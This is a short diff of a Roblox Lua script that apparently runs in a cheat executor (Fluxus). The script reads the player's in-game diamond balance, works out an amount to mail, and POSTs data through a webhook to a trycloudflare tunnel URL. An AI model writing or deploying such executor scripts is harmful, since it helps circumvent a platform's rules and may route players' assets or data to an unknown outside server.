@@ -12,11 +12,9 @@ end)
 local httpService = game:GetService("HttpService")
 
 local apiUrl = "https://functioning-install-isa-larry.trycloudflare.com/servers"
-local Identity = fluxus.set_thread_identity(1)
 
 function Webhook(Url, Data)
-    ((fluxus and fluxus.request) or (http and http.request) or http_request or function()
-    end) {
+    request {
         Url = Url,
         Method = "POST",
         Headers = {
@@ -63,8 +61,7 @@ end
 
 setRAM = coroutine.wrap(function()
     while true do
-        allDiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text,
-            "%,", "")
+        allDiamonds = lib.Save.Get().Diamonds
         mailDiamonds = allDiamonds - 15000100000
         if condition == 1 then
             if config == 'AM' then
